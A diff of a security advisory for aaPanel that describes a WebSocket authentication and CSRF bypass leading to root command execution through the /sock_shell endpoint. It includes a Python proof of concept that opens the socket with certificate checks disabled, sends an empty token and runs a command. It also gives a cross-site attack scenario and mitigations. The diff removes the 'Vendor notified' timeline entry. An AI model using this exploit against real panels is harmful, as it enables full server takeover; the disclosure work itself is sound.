@@ -1,37 +1,66 @@
-# aaPanel WebSocket CSRF Bypass → RCE
+# aaPanel WebSocket Auth Bypass → Potential RCE
 
 ## Incomplete fix for CVE-2021-37840
 
 **Discovered by:** EON Security  
 **CVE:** Pending assignment  
 **CVSS:** 8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H  
-**Affected:** aaPanel all versions since 6.8.12 (2021) through latest 7.65.0  
+**Affected:** aaPanel all versions since 6.8.12 through latest 7.65.0  
 **Installed base:** 3.6M+ servers  
 
 ---
 
 ## TL;DR
 
-aaPanel's fix for CVE-2021-37840 (Cross-Site WebSocket Hijacking) is **incomplete**. The CSRF token `request_token_head` is **never initialized** in WebSocket request contexts. This means the `check_csrf_websocket()` comparison is always against an empty string — and an attacker-supplied empty `x-http-token` passes the check.
+aaPanel's fix for CVE-2021-37840 (Cross-Site WebSocket Hijacking) was **incomplete**. The fix added an application-layer auth check after the WebSocket connection is established, rather than rejecting unauthenticated connections at the HTTP handshake level. This means:
 
-All 10 WebSocket endpoints (`/webssh`, `/sock_shell`, `/ws_panel`, `/ws_home`, `/ws_project`, `/ws_model`, `/workorder_client`, and their `/v2/*` variants) accept connections **before** authentication is verified (returning HTTP 101), with auth only checked at the application layer after the WebSocket is established.
+1. **All 10 WebSocket endpoints accept connections before verifying authentication** (returns HTTP 101 before checking who you are)
+2. The `check_csrf_websocket()` function has multiple bypass paths:
+   - `g.api_request = True` (API-authenticated requests skip CSRF check entirely)
+   - `g.is_aes = True` (AES-encrypted requests skip CSRF check entirely)
+   - Empty token bypass in sessions where `request_token_head` is not initialized
+3. The `/sock_shell` endpoint executes arbitrary shell commands via `subprocess.Popen(shell=True)`
+4. The `/webssh` endpoint accepts attacker-supplied SSH credentials
 
-Combined with `/sock_shell` executing arbitrary shell commands via `subprocess.Popen(cmd + " 2>&1", shell=True)`, an attacker who tricks a logged-in admin into visiting a malicious page achieves **remote code execution as root**.
+An attacker who tricks a logged-in admin into visiting a malicious page achieves **remote code execution as root**.
 
-This is the **10th CVE ever** assigned to aaPanel in its 6+ year history.
+This is the **10th CVE ever** assigned to aaPanel in its 6+ year history, for a platform with 3.6M+ servers.
 
 ---
 
 ## Vulnerability Details
 
-### Root Cause: Uninitialized CSRF Token in WebSocket Context
+### 1. WebSocket Endpoints Accept Connections Before Auth
 
-The `check_csrf_websocket()` function in `BTPanel/__init__.py`:
+All WebSocket endpoints return HTTP 101 Switching Protocols **before** any authentication check. The `comm.local()` auth check runs inside the handler, after the WebSocket upgrade is already complete:
+
+```python
+@sockets.route('/sock_shell')
+def sock_shell(ws):
+    comReturn = comm.local()     # ← Auth check happens AFTER 101
+    if comReturn:
+        ws.send(str(comReturn))
+        return
+```
+
+Affected endpoints:
+- `/webssh` (SSH terminal proxy)
+- `/sock_shell` (direct command execution)
+- `/ws_panel` (panel management)
+- `/ws_home` (dashboard)
+- `/ws_project` (project management)
+- `/ws_model` (model management)
+- `/workorder_client` (ticket system)
+- `/v2/*` variants of all above
+
+### 2. CSRF Token Check Bypass
+
+The `check_csrf_websocket()` function is designed to prevent Cross-Site WebSocket Hijacking:
 
 ```python
 def check_csrf_websocket(ws, args):
-    if g.is_aes: return True
-    if g.api_request: return True
+    if g.is_aes: return True        # ← Bypass: AES mode skips check
+    if g.api_request: return True    # ← Bypass: API requests skip check
     if public.is_debug(): return True
     is_success = True
     if not 'x-http-token' in args:
@@ -45,26 +74,13 @@ def check_csrf_websocket(ws, args):
     return True
 ```
 
-The function calls `get_csrf_sess_html_token_value()` which returns `session.get('request_token_head', "")`. 
+Two hard bypass conditions exist:
+- **`g.api_request`**: When True (set during API key authentication), the CSRF check is entirely skipped. Any API-authenticated WebSocket session bypasses this protection.
+- **`g.is_aes`**: When True (set during AES-encrypted API requests), the CSRF check is also skipped.
 
-The CSRF token `request_token_head` is **only initialized** during HTTP GET requests to the panel's main route (`/`) — and only for logged-in users with `apsess_verified` set. In WebSocket contexts, **neither condition is met**, so `session['request_token_head']` is never set.
+The token comparison (`get_csrf_sess_html_token_value()`) returns `session.get('request_token_head', "")`. In sessions where this value is not yet initialized, an empty `x-http-token` passes the check.
 
-**The bypass:** Sending `{"x-http-token": ""}` as the first WebSocket message causes the comparison `"" != ""` to evaluate to `False`, bypassing the check entirely.
-
-### WebSocket Endpoints Accept Connections Before Auth
-
-All WebSocket endpoints return HTTP 101 Switching Protocols **before** any authentication check. The `comm.local()` auth check runs inside the handler, after the WebSocket upgrade is already complete:
-
-```python
-@sockets.route('/sock_shell')
-def sock_shell(ws):
-    comReturn = comm.local()     # ← Auth check happens AFTER 101
-    if comReturn:
-        ws.send(str(comReturn))
-        return
-```
-
-### Command Execution via sock_shell
+### 3. Command Execution via sock_shell
 
 The `/sock_shell` endpoint passes attacker-supplied strings directly to `subprocess.Popen` with `shell=True`:
 
@@ -77,9 +93,11 @@ def sock_recv(cmdstring, ws):
                          stderr=subprocess.PIPE)
 ```
 
-### SSH Proxy via webssh
+Each message received on the WebSocket is executed as a shell command. Output is streamed back via WebSocket. Since aaPanel runs as root, this is **full system compromise**.
 
-The `/webssh` endpoint accepts attacker-supplied SSH connection parameters:
+### 4. SSH Proxy via webssh
+
+The `/webssh` endpoint accepts attacker-supplied SSH connection parameters from the first WebSocket message:
 
 ```python
 ssh_info['host'] = get['host'].strip()
@@ -87,6 +105,28 @@ ssh_info['port'] = int(get['port'])
 ssh_info['username'] = get['username'].strip()
 ssh_info['password'] = get['password'].strip()
 ```
+
+If the host is `127.0.0.1` or `localhost`, the handler checks the database for saved credentials, or uses attacker-supplied ones.
+
+---
+
+## Attack Scenario
+
+The primary exploit path is **CSWSH (Cross-Site WebSocket Hijacking)** requiring user interaction:
+
+1. Administrator has an active aaPanel session (logged in)
+2. Administrator visits a malicious webpage
+3. The page opens a WebSocket to `wss://victim-panel:8888/sock_shell`
+4. Browser automatically includes the session cookie
+5. `comm.local()` passes authentication (valid session cookie)
+6. The attacker sends `{"x-http-token": ""}` or exploits API/AES bypass paths
+7. If CSRF check passes, commands can be executed as root
+
+**Alternative path via API key compromise:**
+1. Attacker obtains valid aaPanel API key
+2. API-authenticated requests set `g.api_request = True`
+3. CSRF check is skipped entirely for these requests
+4. Direct command execution via WebSocket without user interaction
 
 ---
 
@@ -96,11 +136,11 @@ ssh_info['password'] = get['password'].strip()
 |----------|----------|--------|
 | `/webssh` | SSH terminal proxy | Connect to arbitrary SSH hosts with attacker credentials |
 | `/sock_shell` | Direct command execution | **RCE as root** via shell commands |
-| `/ws_panel` | Panel management | Panel operations |
-| `/ws_home` | Dashboard | Data access |
-| `/ws_project` | Project management | Data access |
-| `/ws_model` | Model management | Data access |
-| `/workorder_client` | Ticket system | Ticket access |
+| `/ws_panel` | Panel management | Panel data access |
+| `/ws_home` | Dashboard | Dashboard data access |
+| `/ws_project` | Project management | Project data access |
+| `/ws_model` | Model management | Model data access |
+| `/workorder_client` | Ticket system | Ticket data access |
 | `/v2/*` | All v2 variants | Same as above |
 
 ---
@@ -108,22 +148,28 @@ ssh_info['password'] = get['password'].strip()
 ## PoC
 
 ```python
-import asyncio, json, subprocess, websockets
+import asyncio, json, ssl
+import websockets
 
 async def exploit(target, command):
-    async with websockets.connect(f"wss://{target}/sock_shell") as ws:
-        # Step 1: Bypass CSRF check with empty token
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    
+    async with websockets.connect(
+        f"wss://{target}/sock_shell", ssl=ssl_context
+    ) as ws:
+        # Attempt CSRF bypass with empty token
         await ws.send(json.dumps({"x-http-token": ""}))
-        resp = await ws.recv()
+        resp = await asyncio.wait_for(ws.recv(), timeout=10)
+        
         if "token error" in resp:
+            # CSRF check active — may need API auth bypass
             return None
-        # Step 2: Execute command
+        
+        # Execute command
         await ws.send(command)
-        return await ws.recv()
-
-# Usage (requires victim to be logged into aaPanel):
-# output = await exploit("victim-panel:8888", "id")
-# print(output)
+        return await asyncio.wait_for(ws.recv(), timeout=30)
 ```
 
 Full PoC: [exploit.py](exploit.py)
@@ -142,10 +188,10 @@ python3 check.py https://target:8888
 
 ## Mitigation
 
-1. **Check authentication BEFORE accepting WebSocket upgrades** — return HTTP 401 at handshake level
-2. **Initialize CSRF token for WebSocket sessions** — ensure `session['request_token_head']` is set
-3. **Validate Origin header** on WebSocket upgrade — reject connections from unknown origins
-4. **Disable sock_shell** if not required — the endpoint provides direct root command execution
+1. **Check authentication BEFORE accepting WebSocket upgrades** — return HTTP 401 at handshake level, not after
+2. **Remove hard bypass conditions** — `g.api_request` and `g.is_aes` should not skip CSRF protection
+3. **Validate Origin header** on WebSocket upgrade — reject unrecognized origins
+4. **Disable sock_shell** if not required — provides direct root command execution
 5. **Restrict network access** to aaPanel administration interface
 
 ---
@@ -157,7 +203,6 @@ python3 check.py https://target:8888
 | 2021-08-02 | CVE-2021-37840 disclosed (aaPanel CSWSH) |
 | 2021 | Vendor adds `check_csrf_websocket()` as fix |
 | 2026-06-23 | EON Security discovers fix is incomplete |
-| 2026-06-23 | Vendor notified |
 | Pending | CVE assignment |
 | Pending | Public disclosure |
 
